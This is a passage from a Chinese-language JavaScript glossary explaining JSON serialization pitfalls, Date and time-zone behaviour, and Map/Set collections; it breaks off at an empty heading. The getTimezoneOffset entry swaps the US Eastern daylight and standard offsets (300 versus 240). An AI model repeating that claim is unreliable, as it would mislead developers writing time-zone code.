如果被序列化的值上存在 `toJSON()` 方法，`JSON.stringify` 会先调用它，并用它的返回值替代该值参与后续序列化。它是「对象自己决定我该如何被序列化」的标准钩子：`Date.prototype.toJSON` 正是这样把日期输出成 ISO 8601 字符串的。你可以给自己的类定义 `toJSON()` 来隐藏内部字段、转换单位、或把不可序列化的部分换成可序列化形式。**注意**：`toJSON` 接收一个 `key` 参数（该值所在的键名），并且在**任何**层级的序列化中都会被调用，包括嵌套深处。也见 JSON.stringify、序列化陷阱。

示例：[`21_json/06_tojson_method.js`](21_json/06_tojson_method.js)

### 序列化陷阱（JSON 有损性）

`JSON.stringify` 会静默丢弃或改写一批值，这是「JSON 深拷贝」和「网络传输」中最常见的 bug 来源：`undefined`、函数、Symbol 作为属性值时**整个键被丢弃**（数组里则变成 `null`）；`NaN` 与 `Infinity` 变成 `null`；`Date` 变成 ISO 字符串（不再是 Date 实例）；`RegExp`、`Map`、`Set` 变成 `{}`；`BigInt` 直接抛 `TypeError`；`-0` 变 `0`；类实例的**原型与 getter 语义全部丢失**，只留下自有可枚举属性。要保真传输就得自定义 `toJSON` + `reviver`，或者换用 `structuredClone`（支持 Date/Map/Set/循环引用，但仍不支持函数与类原型）。也见 JSON 深拷贝、循环引用。

示例：[`21_json/04_serialization_edge_cases.js`](21_json/04_serialization_edge_cases.js)

### Circular Reference（循环引用）

对象图里出现 `a.self = a` 或 `a.b = b; b.a = a` 这样的自引用时，`JSON.stringify` 无法用有限文本表达，会直接抛 `TypeError: Converting circular structure to JSON`。因为 JSON 是**树**结构，而内存里的对象是**图**结构，两者表达能力不对称。解决办法有：用 `replacer` 检测并跳过/替换已访问对象、用 `structuredClone`（原生支持循环引用）、用 WeakSet 手动实现深拷贝、或改用支持引用的序列化方案。也见 序列化陷阱。

示例：[`21_json/04_serialization_edge_cases.js`](21_json/04_serialization_edge_cases.js)

### JSON Lines / NDJSON（逐行 JSON）

一种「每行一个独立 JSON 文档、行与行之间用换行分隔」的文本格式（文件扩展名常为 `.jsonl`/`.ndjson`）。它不是 JSON 标准的一部分，却非常适合日志与大数据：可以**流式处理**（读一行解析一行，内存占用恒定，不受文件大小影响）、可以在文件末尾**追加**（而整个数组式的 JSON 必须整体重写）、单行损坏也只影响一行。**注意点**：不能有跨行的美化缩进（每个对象必须压成一行），解析时要处理空行与末尾换行符。也见 JSON.parse、Serialization / Deserialization（序列化与反序列化）。

示例：[`21_json/08_json_lines.js`](21_json/08_json_lines.js)

### JSON.rawJSON（ES2025）

一个静态方法，把一段**未被转义的 JSON 原文**包装成特殊对象，交给 `JSON.stringify` 时**原样嵌入**结果——既不解析成 Number 也不加引号。它主要用于**大整数精度的序列化侧**：`JSON.stringify({ id: JSON.rawJSON('1234567890123456789') })` 能得到 `{"id":1234567890123456789}`，一个字符都不丢；而若用普通数字字面量，JS 的 `Number` 早就把它变成 `1234567890123456800` 了。配套的 `JSON.isRawJSON(value)` 用来判断某个值是否是这种包装。**限制**：传入的字符串必须本身就是合法 JSON 片段，否则 `JSON.rawJSON` 会抛 `SyntaxError`。也见 大整数精度。

示例：[`21_json/09_raw_json_and_big_numbers.js`](21_json/09_raw_json_and_big_numbers.js)

### 大整数精度（BigInt 与 JSON）

JS 的 `Number` 是 IEEE 754 双精度浮点，只能精确表示到 2^53 - 1（`Number.MAX_SAFE_INTEGER = 9007199254740991`），超出后相邻整数会「合并」成同一个值。而 JSON 本身对整数长度**没有限制**，于是「后端用字符串或大数传的雪花 ID / 订单号」在 `JSON.parse` 之后经常被悄悄改掉尾数，且毫无报错。三种对策：用 `JSON.rawJSON` 在序列化侧原样输出、用 `reviver` 的第三参数 `context.source` 在解析侧拿回原文再决定转成 `BigInt` 还是字符串（`JSON.parse` 的 `context.source`，Node 22+）、或干脆约定这类字段以字符串形式传输。也见 JSON.rawJSON、reviver 的 context.source。

示例：[`21_json/09_raw_json_and_big_numbers.js`](21_json/09_raw_json_and_big_numbers.js)

### reviver 的 context.source（原文还原）

ES2025 给 `JSON.parse` 的 `reviver` 增加了第三个参数 `context`，其唯一的 `source` 属性保存了**该节点在原始文本里的那段原文**。于是 `JSON.parse('{"n": 1.50}', (k, v, ctx) => ctx.source)` 里 `v` 是数字 `1.5`，而 `ctx.source` 是字符串 `"1.50"` —— 精度与写法被完整保留。它是「大整数精度」问题在**解析侧**的答案：拿到原文后再决定转 `BigInt`、转字符串，或保留原样。**注意**：`context.source` 只在该 reviver 被调用的节点上有效，且只在支持该特性的运行时（Node 22+ / 新版浏览器）可用。也见 大整数精度、reviver。

示例：[`21_json/10_parse_source_context.js`](21_json/10_parse_source_context.js)

### Lone Surrogate（孤立代理项）

UTF-16 用「代理对」表示 BMP 之外的字符（如 emoji），单个代理项本身不是合法字符。JSON 文本里允许出现 `\uD800` 这类**孤立代理项**，解析后 JS 字符串里就会留下它们；而某些序列化目标（如 `encodeURIComponent`、UTF-8 编码、写入文本文件）遇到孤立代理项会抛错或产生乱码。ES2019 起 `JSON.stringify` 会把孤立代理项输出为转义形式 `\uD800`（`well-formed JSON.stringify`），保证了结果可以被安全编码，但反序列化回来仍是「半截」的字符。实践建议是在入口处清洗或用 `String.prototype.toWellFormed()` 修正。也见 JSON.stringify、序列化陷阱。

示例：[`21_json/11_lone_surrogates.js`](21_json/11_lone_surrogates.js)

### JSON 深拷贝（Deep Clone with JSON）

`JSON.parse(JSON.stringify(obj))` 是流传最广的深拷贝写法，一行搞定且能切断引用关系。但它是一把**有明确射程**的工具：由于前面提到的序列化陷阱，它会丢失 `undefined`/函数/Symbol、把 `Date` 变字符串、把 `NaN` 变 `null`、让 `Map`/`Set`/RegExp 变空对象、遇到 `BigInt` 或循环引用直接抛错，还会丢掉原型与 getter。**适用场景**：结构简单、只含 JSON 合法类型的纯数据（配置、DTO）。需要保真时改用 `structuredClone`（支持 Date/Map/Set/循环引用/ArrayBuffer）或专门的深拷贝实现。也见 序列化陷阱、Circular Reference（循环引用）。

示例：[`21_json/05_deep_clone_with_json.js`](21_json/05_deep_clone_with_json.js)

---

## 日期与时间（22_date_and_time）

### Date（Date 对象）

JavaScript 内置的日期时间类型，本质是**一个毫秒数**（自 Unix 纪元起的毫秒偏移量），范围约为 ±1 亿天（±8.64e15 毫秒）。它的所有「年月日时分秒」方法都是在这个数值和「某个时区下的墙上时间」之间来回换算，`Date` 自身不存储时区信息。它同时承担了「绝对时刻」和「墙上时间」两套语义，这正是绝大多数日期 bug 的根源。`Date` 是**可变对象**，`setXxx()` 会就地修改自己；比较两个 `Date` 必须比 `getTime()` 而不是用 `===`（后者比的是引用）。也见 [Timestamp（时间戳）](#timestamp时间戳)、[Date Mutability（Date 的可变性）](#date-mutabilitydate-的可变性)。

示例：[`22_date_and_time/01_date_creation.js`](22_date_and_time/01_date_creation.js)

### Timestamp（时间戳）

在本仓库语境下「时间戳」通常指 **Unix 毫秒时间戳**，即 `Date.now()` / `date.getTime()` 返回的那个数；它是**无时区**的绝对量，因此是跨时区传输和存储日期的首选形式。关键细节：`Date.now()` 是**墙上时钟**，会被 NTP 校时、用户改系统时间、闰秒调整影响，可能「倒流」；做性能测量必须换成单调的 `performance.now()`。常见误解是把「时间戳」当成秒 —— 后端接口（如 JWT 的 `exp`、Unix `mtime`）多数字段是**秒**，混用会导致日期差出几十年（2024 年的秒级时间戳约 1.7e9，毫秒级约 1.7e12）。也见 [Milliseconds vs Seconds（毫秒与秒）](#milliseconds-vs-seconds毫秒与秒)、[Monotonic Clock（单调时钟）](#monotonic-clock单调时钟)。

示例：[`22_date_and_time/02_timestamp.js`](22_date_and_time/02_timestamp.js)

### Unix Epoch（Unix 纪元）

时间戳的零点，定义为 **1970-01-01T00:00:00Z**（UTC），即 `new Date(0).toISOString() === '1970-01-01T00:00:00.000Z'`。选这个日期是 Unix 早期工程上的约定，与 1970 年本身没有任何语义。关键细节：`Date` 的时间戳是**毫秒**，而经典 Unix `time_t` 是**秒**，所以在 JS 和 C/后端之间转换要乘除 1000，并且要用 `Math.floor`/`Math.trunc` 取整而不是 `| 0`（`| 0` 会截断成 32 位，1970-01-25 之后的日期就全错了）。也见 [Timestamp（时间戳）](#timestamp时间戳)。

示例：[`22_date_and_time/02_timestamp.js`](22_date_and_time/02_timestamp.js)

### Milliseconds vs Seconds（毫秒与秒）

JS 原生只有毫秒精度（历史上 V8 甚至把 `Date.now()` 粗化到 1ms 以上以对抗 Spectre），需要微秒/纳秒必须靠 `performance.now()`（小数毫秒）或 `process.hrtime.bigint()`（纳秒 BigInt）。工程上最容易出错的一步就是混淆两者的量纲：把秒当毫秒会得到 1970 年，把毫秒当秒会得到公元 5 万年并触发 `Invalid Date`（超出 ±8.64e15）。**约定命名**（`createdAtMs` / `expiresInSec`）是最好的防御。也见 [Unix Epoch（Unix 纪元）](#unix-epochunix-纪元)。

示例：[`22_date_and_time/02_timestamp.js`](22_date_and_time/02_timestamp.js)

### UTC（Coordinated Universal Time，协调世界时）

全世界统一的时刻基准，`Date` 内部按它存储，`toISOString()` 与所有 `getUTC*()` 方法都按它输出。注意 UTC 不等于 GMT（格林尼治平时）：GMT 是一个时区名，UTC 是一套原子钟时间标准，日常使用中二者数值相同可以互换，但精确表述上不应混用。关键细节：**没有任何 JS API 能得到「服务器时区」或「用户真实位置时区」** —— `Date` 的「本地时间」永远只是**运行环境**的时区，服务端渲染与客户端渲染会得到不同结果，这就是 SSR 水合（hydration）时「日期差一天」警告的来源。也见 [Timezone（时区）](#timezone时区)。

示例：[`22_date_and_time/07_timezone_basics.js`](22_date_and_time/07_timezone_basics.js)

### Local Time（本地时间）

「本地时间」= UTC 时刻 + 运行环境当前生效的 UTC 偏移，由 `getFullYear()`/`getHours()` 等方法给出。它是一个**换算结果而不是存储的状态**：同一次 `Date.now()` 在中国读出 `09:30`、在伦敦读出 `01:30`。常见误解是以为 `new Date()` 会「记住你的时区」——它不会，`Date` 对象没有时区字段，时区是调用方法那一刻从系统（或 `Intl` 的 `timeZone` 选项）现取的。因此单元测试里断言本地时间几乎必然在 CI 上挂掉（容器常设为 UTC）。也见 [UTC（协调世界时）](#utccoordinated-universal-time协调世界时)。

示例：[`22_date_and_time/07_timezone_basics.js`](22_date_and_time/07_timezone_basics.js)

### Timezone（时区）

同一个时刻在不同地区显示不同的墙上时间，`Date` 对象内部**只存一个 UTC 时间戳**，所谓「本地时间」是按运行环境时区即时算出来的。因此两个最容易踩的坑是：(1) `new Date('2025-01-01')`（只有日期）按 **UTC** 解析，而 `new Date('2025/01/01')` 按**本地时区**解析，同一份代码在不同机器上结果可能差一天；(2) `getHours()` 这类方法的结果依赖机器时区，写测试时必须换成 `getUTCHours()` 或显式指定时区，否则换台机器就挂。要按**任意指定的 IANA 时区**（如 `'America/New_York'`）格式化，只能借助 `Intl.DateTimeFormat` 的 `timeZone` 选项或 `toLocaleString`，`Date` 自己做不到。也见 [UTC Offset（UTC 偏移）](#utc-offsetutc-偏移)、[tzdata（时区数据库）](#tzdata时区数据库)。

示例：[`22_date_and_time/07_timezone_basics.js`](22_date_and_time/07_timezone_basics.js)

### UTC Offset（UTC 偏移）

某地墙上时间与 UTC 的固定差值，写法形如 `+08:00`、`-05:00`、`Z`（等于 `+00:00`）。关键细节：偏移在 ISO 字符串里是**唯一能消除歧义**的信息，`'2025-03-15T09:30:45+08:00'` 是确定时刻，`'2025-03-15T09:30:45'` 不是（规范按本地时区解释）。偏移和时区**不是一回事**：`Asia/Shanghai` 永远 `+08:00`，但 `America/New_York` 一年里在 `-05:00` 和 `-04:00` 之间来回切换 —— 所以存储时应当存 IANA 时区名（`Asia/Shanghai`）而不是偏移。也见 [DST（夏令时）](#dstdaylight-saving-time夏令时)。

示例：[`22_date_and_time/07_timezone_basics.js`](22_date_and_time/07_timezone_basics.js)

### getTimezoneOffset（时区偏移方法）

`date.getTimezoneOffset()` 返回本地时间与 UTC 的差值，单位**分钟**，符号是 **UTC 减本地** —— 所以中国（UTC+8）返回 `-480`，而不是 `480`，这个反直觉的符号是本册最经典的坑之一。第二个坑是它**依赖调用时刻**：美国东部夏令时返回 `300`，冬令时返回 `240`，同一个程序冬天夏天输出不同。要用它把本地时间转成时间戳，正确姿势是 `utcMs = localDate.getTime() + offset * 60 * 1000`，但更稳妥的做法是干脆不要用它，全程用 UTC 运算。也见 [UTC Offset（UTC 偏移）](#utc-offsetutc-偏移)。

示例：[`22_date_and_time/07_timezone_basics.js`](22_date_and_time/07_timezone_basics.js)

### DST（Daylight Saving Time，夏令时）

部分时区在夏季把时钟拨快一小时的制度，它给编程带来两类「坏时刻」：(1) **不存在的时刻** —— 春季拨快时 02:00~03:00 被跳过，`new Date(2024, 2, 10, 2, 30)` 在 `America/New_York` 会得到 03:30，程序里约定的「凌晨 2 点跑任务」当天会静默偏移；(2) **重复的时刻** —— 秋季拨回时 01:00~02:00 出现两次，同一段墙上时间对应两个不同的时间戳，JS 规范规定按「较早的那个」消除歧义。中国自 1991 年起不再实行夏令时，所以国内开发者常常意识不到这些问题的存在，但用户一旦在欧美就会大面积暴露。设计上应当**按 UTC 存储和计算、只在展示层本地化**，并避免把定时任务定在凌晨的整点区间。

示例：[`22_date_and_time/10_date_pitfalls.js`](22_date_and_time/10_date_pitfalls.js)

### ISO 8601（ISO 8601 日期时间格式）

国际标准化组织定义的日期时间书写格式，形如 `2025-03-15`（日期）、`2025-03-15T09:30:45.123Z`（UTC 时刻）、`2025-03-15T09:30:45+08:00`（带偏移）。`date.toISOString()` 是 JS 里唯一**保证格式与长度稳定**的序列化方法（固定 24 或 25 个字符，永远以 `Z` 结尾），所以 API 传输一律用它。关键细节：`Date.parse` 对日期部分格式（`YYYY-MM-DD`）**强制按 UTC** 解释，对日期时间部分（`YYYY-MM-DDTHH:mm:ss`）**不带时区时按本地**解释，这个不一致是「差一天」问题的元凶；而 `toISOString()` 遇到 `Invalid Date` 会抛 `RangeError`（这是 `Invalid Date` 唯一的报错出口，其余运算都静默返回 `NaN`）。也见 [RFC 2822](#rfc-2822rfc-2822-日期格式)、[Date Parsing Pitfalls（解析字符串的陷阱）](#date-parsing-pitfalls解析字符串的陷阱)。

示例：[`22_date_and_time/05_date_formatting.js`](22_date_and_time/05_date_formatting.js)

### ISO Week Date（ISO 周历）

把日期表达成「年 + 第几周 + 星期几」的一套规则，用于欧洲日历、财务周期、排课表与周报系统。三条规则：一周从**周一**开始；第 1 周是**包含 1 月 4 日**的那一周（等价于包含当年第一个周四的那一周）；因此一年的第一周可能从上一年 12 月开始。JS **没有** `getWeek()`，`Intl.DateTimeFormat` 也不提供周数，必须手写。最大的坑是 **week-year ≠ calendar-year**：`2025-12-29` 是周一，它所在周的周四是 `2026-01-01`，所以它属于「2026 年第 1 周」，按自然年分组会把同一周劈成两半。也见 [ISO 8601](#iso-8601iso-8601-日期时间格式)。

示例：[`22_date_and_time/11_iso_week.js`](22_date_and_time/11_iso_week.js)

### RFC 2822（RFC 2822 日期格式）

电子邮件头部使用的日期格式，形如 `Tue, 15 Mar 2024 09:30:45 +0800`：星期与月份是英文缩写、偏移不写冒号、可以带时区缩写名（`GMT`、`EST`）。`Date.prototype.toString()` 和 `toUTCString()` 产出的正是这一族格式，规范要求 `Date.parse` 必须能解析自己 `toString()` 的输出，所以在 JS 里解析 RFC 2822 是**可移植**的。陷阱在于它允许省略时区和星期，缺时区时按本地解释，且时区缩写（如 `CST`）有歧义（中国标准时间 / 美国中部时间）。也见 [ISO 8601](#iso-8601iso-8601-日期时间格式)。

示例：[`22_date_and_time/06_date_parsing.js`](22_date_and_time/06_date_parsing.js)

### Date Parsing Pitfalls（解析字符串的陷阱）

`Date.parse` / `new Date(str)` 只**强制**支持 ISO 8601 格式，其余格式（`'March 15, 2024'`、`'2024/03/15'`、`'15-03-2024'`）属于实现自定义行为，V8、JavaScriptCore、SpiderMonkey 各有各的解释，同一份代码换引擎就可能得到不同结果甚至 `Invalid Date`。实用结论只有一条：**只把带完整时区的 ISO 8601 字符串喂给 `Date`**，其余一律自己用正则拆出年份、月份等分量，再用 `new Date(y, m - 1, d)` 或 `Date.UTC(...)` 构造。也见 [ISO 8601](#iso-8601iso-8601-日期时间格式)、[RFC 2822](#rfc-2822rfc-2822-日期格式)。

示例：[`22_date_and_time/06_date_parsing.js`](22_date_and_time/06_date_parsing.js)

### Date Mutability（Date 的可变性）

`Date` 不是值类型而是可变对象：把 `Date` 传进函数、放进对象、存进 `Map`，拿到的都是同一个引用，任何一处调用 `setHours()` 都会影响所有持有者。与之配套的两个陷阱是：`const d = new Date()` 里的 `const` 只锁住变量绑定，`d.setFullYear(2030)` 照样生效；`d1 === d2` 比较的是引用而非时刻，必须写 `d1.getTime() === d2.getTime()`（或 `+d1 === +d2`）。防御方式是**把日期运算写成纯函数，绝不修改入参**，需要副本时用 `new Date(d)` 或 `new Date(d.getTime())`。也见 [Date（Date 对象）](#datedate-对象)。

示例：[`22_date_and_time/10_date_pitfalls.js`](22_date_and_time/10_date_pitfalls.js)

### Date Constructor Pitfalls（构造函数的两个经典陷阱）

第一，**月份从 0 开始**：`new Date(2024, 1, 1)` 是 2 月 1 日而不是 1 月 1 日，`getMonth()` 返回的也永远要 `+1` 才是人类月份；这是从 Java `java.util.Date` 继承下来的历史包袱，无法修复。第二，**年份分量 0~99 会被映射到 1900~1999**：`new Date(99, 0, 1).getFullYear()` 是 `1999`，`new Date(24, 0, 1)` 是 `1924` —— 处理「24 年」这样的两位数年份输入时必须先补成四位。`Date.UTC()` 同样继承这两条规则。也见 [Date Mutability（Date 的可变性）](#date-mutabilitydate-的可变性)。

示例：[`22_date_and_time/01_date_creation.js`](22_date_and_time/01_date_creation.js)

### Date Arithmetic（日期运算）

推荐做法是**把日期转成时间戳做加减，再转回 `Date`**：时间戳运算是纯数值运算，不受时区与夏令时干扰，且天然是纯函数。两个反例：直接加 `24 * 3600 * 1000` 毫秒来「加一天」在夏令时切换日会得到 23 或 25 小时的偏移；`setMonth(getMonth() + 1)` 在月末会**溢出进位**（1 月 31 日 + 1 个月 = 3 月 2 日或 3 日，因为 2 月 31 日被规范化到 3 月）。真正的「加一个日历月」需要自己钳制日号，`Temporal` 的 `add({ months: 1 })` 才有内建的 `overflow: 'constrain'` 语义。也见 [Timestamp（时间戳）](#timestamp时间戳)。

示例：[`22_date_and_time/04_date_arithmetic.js`](22_date_and_time/04_date_arithmetic.js)

### tzdata（时区数据库）

操作系统或运行时内置的「时区规则表」，记录了每个 IANA 时区（`Asia/Shanghai`、`Europe/Berlin`）历史上所有的 UTC 偏移与夏令时起止时间。JS 引擎（V8）通过 ICU 使用它，因此 `Intl.DateTimeFormat().resolvedOptions().timeZone` 才能给出 IANA 名字。关键影响：**各国会临时修改时区规则**（如 2022 年墨西哥取消夏令时），旧版 Node 内置的 tzdata 是旧的，同一份代码在升级前后的输出可能不同；Docker 镜像若未装 `tzdata`，容器里可能只有 UTC。也见 [Timezone（时区）](#timezone时区)。

示例：[`22_date_and_time/07_timezone_basics.js`](22_date_and_time/07_timezone_basics.js)

### getters / setters 家族（读取与修改日期分量）

`getFullYear`/`getMonth`/`getDate`/`getDay`/`getHours`/`getMinutes`/`getSeconds`/`getMilliseconds` 读本地分量，加 `UTC` 前缀（`getUTCHours`）读 UTC 分量；`setXxx()` 同名系列就地修改对象并返回新的时间戳。三个易踩点：`getDay()` 返回 **0=周日**（与 ISO 周历的「周一为一周之始」冲突，写周历时必须换算）；`getMonth()` 从 0 开始；`setXxx()` 都支持**越界值**并自动进位（`setDate(32)` 会滚到下个月，`setHours(-1)` 会退到前一天 23:00），这既是便利也是 bug 来源。也见 [Date Constructor Pitfalls（构造函数的两个经典陷阱）](#date-constructor-pitfalls构造函数的两个经典陷阱)。

示例：[`22_date_and_time/03_date_getters_setters.js`](22_date_and_time/03_date_getters_setters.js)

### Intl.DateTimeFormat（国际化日期格式化）

`Intl` 命名空间下的本地化日期格式化器，按 locale 输出各国的日期写法（`en-US` 的 `3/15/2024`、`de-DE` 的 `15.3.2024`、`zh-CN` 的 `2024/3/15`），并支持 `timeZone`、`dateStyle`、`hour12`、`calendar` 等选项。它比手写 `YYYY-MM-DD` 拼接**更正确**（自动处理语言、月份名、序数），也是 `Date` 生态里**唯一能按任意 IANA 时区展示**的官方手段（`new Intl.DateTimeFormat('en-US', { timeZone: 'Asia/Tokyo' })`）。性能提示：`Intl` 对象构造昂贵，应当**复用实例**而不是在循环里 `new`。本册只讲它与日期的交叉，语言区域细节请见国际化分册 [`33_intl/01_intl_overview.js`](33_intl/01_intl_overview.js)。也见 [Intl.RelativeTimeFormat（相对时间格式化）](#intlrelativetimeformat相对时间格式化)。

示例：[`22_date_and_time/08_intl_datetimeformat.js`](22_date_and_time/08_intl_datetimeformat.js)

### Intl.RelativeTimeFormat（相对时间格式化）

把「3 天前」「in 2 hours」这类**相对时间**本地化的格式化器：`new Intl.RelativeTimeFormat('zh-CN', { numeric: 'auto' }).format(-3, 'day')` 得到「3天前」。关键细节：它**不做计算**，只做措辞 —— 「几天前」必须你自己用时间戳相减、再决定用什么单位（秒/分/时/天/月/年）并且处理单复数与阈值。常见误解是以为它能自动选单位；实际项目中通常要写一个「按差值大小挑选单位」的辅助函数。也见 [Intl.DateTimeFormat（国际化日期格式化）](#intldatetimeformat国际化日期格式化)。

示例：[`22_date_and_time/08_intl_datetimeformat.js`](22_date_and_time/08_intl_datetimeformat.js)

### Temporal API（Temporal 日期时间 API）

TC39 设计的 `Date` 替代品（已进入 Stage 3，V8 需要 `--harmony-temporal` 或 polyfill），用一套职责单一的不可变类型彻底解决 `Date` 的混乱：`Temporal.Instant`（绝对时刻，纳秒精度）、`Temporal.ZonedDateTime`（时刻 + IANA 时区，自带夏令时规则）、`Temporal.PlainDateTime`/`PlainDate`/`PlainTime`（不带时区的墙上时间）、`Temporal.Duration`（时间段）、`Temporal.Now`（带时区取当前）。它的对象**全部不可变**，`add`/`subtract` 返回新对象，显式区分「日历运算」和「时刻运算」，并且内置 `withCalendar`、`until`、`round` 等 `Date` 完全没有的能力。迁移提示：`Temporal` 尚未在所有运行时可用，写库时必须特性检测（`typeof Temporal === 'undefined'`）或引入 polyfill，注意 polyfill 体积较大。也见 [Date（Date 对象）](#datedate-对象)。

示例：[`22_date_and_time/09_date_temporal_api.js`](22_date_and_time/09_date_temporal_api.js)

### Monotonic Clock（单调时钟）

只保证**单调不减**、不受系统校时影响的计时来源，浏览器与 Node 里的实现是 `performance.now()`（返回自 `timeOrigin` 起的毫秒小数）。它和 `Date.now()` 的分工是：**测耗时用 `performance.now()`，表达时刻用 `Date.now()`**。关键细节：`Date.now()` 可能因为 NTP 回拨而变小，用两段 `Date.now()` 相减甚至能算出负数；`performance.now()` 的分辨率会被引擎有意粗化（Spectre 缓解），跨进程比较无意义（各进程 `timeOrigin` 不同）；需要绝对时刻时可以算 `performance.timeOrigin + performance.now()`。也见 [Monotonic vs Wall Clock（单调时钟与墙上时钟）](#monotonic-clock单调时钟)。

示例：[`22_date_and_time/02_timestamp.js`](22_date_and_time/02_timestamp.js)

## 集合类型（23_collections）

### Map（映射 / 键值集合）

键可以是**任意类型**（对象、函数、`NaN`、`Symbol`）的键值集合，按**插入顺序**迭代，用 `size` 取元素个数，增删查平均 O(1)。它和 `Object` 的核心分歧在于：`Object` 的键只能是字符串或 Symbol（其余会被 `String()` 强转，`obj[{a:1}]` 实际存在 `"[object Object]"` 下），且 `Object` 会继承原型上的属性、需要用 `Object.create(null)` 或 `hasOwnProperty` 才能安全当字典用。判断键存在必须用 `map.has(k)` 而不是 `map.get(k) !== undefined` —— 因为值本身可能就是 `undefined`。也见 [Map vs Object（Map 与 Object 的取舍）](#map-vs-objectmap-与-object-的取舍)、[SameValueZero（SameValueZero 相等算法）](#samevaluezerosamevaluezero-相等算法)。

示例：[`23_collections/01_map_basics.js`](23_collections/01_map_basics.js)

### Set（集合 / 唯一值集合）

只存**不重复**元素的可迭代集合，同样按插入顺序迭代（注意：这不是数学集合的「无序」语义，`Set` 明确保证顺序）。最常用的场景是数组去重：`[...new Set(arr)]`，比 `filter + indexOf` 的 O(n²) 快得多。三个易错点：`new Set([1, 1, 2])` 的 `size` 是 `2`，但含对象的 `Set` 不会去重内容相同的不同对象（引用比较）；`Set` 没有索引，取第 n 个元素要 `[...set][n]`（O(n)，频繁按下标访问说明该用数组）；`NaN` 会被去重成一个（`SameValueZero` 的功劳），而 `+0` 与 `-0` 被视为同一个元素。也见 [Set vs Array（Set 与 Array 的取舍）](#set-vs-arrayset-与-array-的取舍)、[SameValueZero（SameValueZero 相等算法）](#samevaluezerosamevaluezero-相等算法)。

示例：[`23_collections/03_set_basics.js`](23_collections/03_set_basics.js)

### WeakMap（弱键映射）

键**必须是对象**（ES2023 起也允许非注册的 Symbol），值是任意类型；它对键持**弱引用**，键对象没有其他强引用时会被垃圾回收，对应条目**自动消失**。代价是它**不可遍历、没有 `size`、没有 `clear`、没有 `keys()`**，因为你无法安全地枚举一个随时会变的集合。典型用途：给对象挂「私有数据」（不想暴露成属性）、DOM 节点的元数据、以对象为键的缓存（对象死了缓存自动清理，天然不泄漏）。注意 ES2023 之前用 Symbol 当键会抛 `TypeError`，旧环境需要特性检测。也见 [Map（映射 / 键值集合）](#map映射-键值集合)、[Weak Reference（弱引用）](#weak-reference弱引用)。

示例：[`23_collections/05_weakmap.js`](23_collections/05_weakmap.js)

### WeakSet（弱引用集合）

元素**必须是对象**的集合，对元素持弱引用，同样不可遍历、没有 `size`。它的语义是「给对象打一个不阻止回收的临时标记」，典型用途有：图遍历的「已访问」集合（遍历结束集合自动清空，不会因为 visited 集合而泄漏整张图）、「这个对象已经初始化过」的一次性标记、事件去重。常见误解是把它当「可以自动清理的 `Set`」来存业务数据 —— 由于不可遍历也不可计数，你**无法知道里面有什么**，只能回答 `has()`；需要读取内容就应该用 `Map`/`Set` 配合显式清理。也见 [WeakMap（弱键映射）](#weakmap弱键映射)。

示例：[`23_collections/06_weakset.js`](23_collections/06_weakset.js)

### SameValueZero（SameValueZero 相等算法）

`Map`/`Set`/`WeakMap`/`WeakSet` 判定键是否相同的内部算法：在 `===` 的基础上做两处修改 —— **`NaN` 等于自身**，且 **`+0` 与 `-0` 视为同一个值**。三条实用推论：(1) `new Set([NaN, NaN]).size === 1`，`new Map().set(NaN, 1).get(NaN) === 1`；(2) `new Set([+0, -0]).size === 1`；(3) 它不同于 `Object.is`（`Object.is(NaN, NaN)` 为 `true`，但 `Object.is(+0, -0)` 为 `false`），也不同于 `indexOf` 用的严格相等（所以 `[NaN].indexOf(NaN)` 是 `-1`，而 `[NaN].includes(NaN)` 是 `true`，因为 `includes` 用的是 SameValueZero）。也见 [Map（映射 / 键值集合）](#map映射-键值集合)。

示例：[`23_collections/01_map_basics.js`](23_collections/01_map_basics.js)

### Set Operations（集合运算：并集/交集/差集/对称差集）

ES2025 为 `Set` 增加了原生方法：`a.union(b)`、`a.intersection(b)`、`a.difference(b)`、`a.symmetricDifference(b)`，以及谓词 `a.isSubsetOf(b)`、`a.isSupersetOf(b)`、`a.isDisjointFrom(b)`。在旧环境里只能手写，惯用写法是 `new Set([...a, ...b])`（并集）、`new Set([...a].filter(x => b.has(x)))`（交集）。关键细节：**所有运算都返回新 `Set`，不修改任何操作数**（这是最常被误解的一点）；`union`/`intersection`/`difference` 的结果顺序遵循**接收者**的插入顺序，`symmetricDifference` 则是「先 a 后 b」拼接。旧 Node 上用之前要先 `typeof Set.prototype.union === 'function'` 检测。

示例：[`23_collections/04_set_operations.js`](23_collections/04_set_operations.js)

### Set-like Protocol（类集合协议）

ES2025 集合运算方法的参数**不要求是 `Set`**，只要求符合「类集合（set-like）」形状：拥有 `size` 属性、`has(v)`、`keys()`（返回可迭代对象）三个成员。这带来很强的互操作性：`set.union(map)` 可以直接拿 `Map` 当集合用（`Map` 的 `keys()` 就是键集合），也可以传入自定义的 `SetLike` 对象、甚至用 `Set.prototype.union.call(自定义对象, other)` 借用。要注意的是**接收者**（`this`）必须是真正的 `Set`，只有**参数**才允许是任意类集合对象。

示例：[`23_collections/04_set_operations.js`](23_collections/04_set_operations.js)

### Map vs Object（Map 与 Object 的取舍）

选 `Map` 当**字典/缓存**：键是动态的、可能不是字符串、需要频繁增删、需要 `size`、需要稳定插入顺序。选 `Object` 当**结构体/记录**：字段名在写代码时就已知、需要 JSON 序列化（`JSON.stringify` 对 `Map` 输出 `{}`，必须先用 `Object.fromEntries(map)`）、需要字面量语法与解构、需要属性描述符与原型机制。性能上二者在现代 V8 里都是哈希表，差距不大，但 `Object` 在「固定形状（hidden class）」的热路径上更快；反过来说，把 `Object` 当无界缓存会导致 key 爆炸并退化成字典模式。三个额外差异：`Object` 键会被强转为字符串、`Object` 有原型链污染风险（`__proto__`）、`Object` 的整数键会**自动升序**排在字符串键前面，而 `Map` 严格按插入顺序。也见 [Map（映射 / 键值集合）](#map映射-键值集合)。

示例：[`23_collections/07_map_vs_object.js`](23_collections/07_map_vs_object.js)

### Set vs Array（Set 与 Array 的取舍）

`Array` 有序、有索引、允许重复，`indexOf`/`includes` 是 O(n)；`Set` 无索引、元素唯一，`has` 是 O(1)。因此「去重」「判断存在」「集合运算」用 `Set`，而「按下标随机访问」「需要 `map`/`filter`/`sort` 等变换」「需要 JSON 数组形态」用 `Array`。实战里二者经常配合：`[...new Set(arr)]` 去重后再排序；或者先用 `Set` 建立索引加速，再回到数组遍历。常见误解是以为 `Set` 的迭代顺序是「无序」的 —— 规范明确保证**插入顺序**，`delete` 后重新 `add` 会排到末尾（这正是 LRU 实现的基础）。

示例：[`23_collections/08_set_vs_array.js`](23_collections/08_set_vs_array.js)

### Insertion Order（插入顺序）

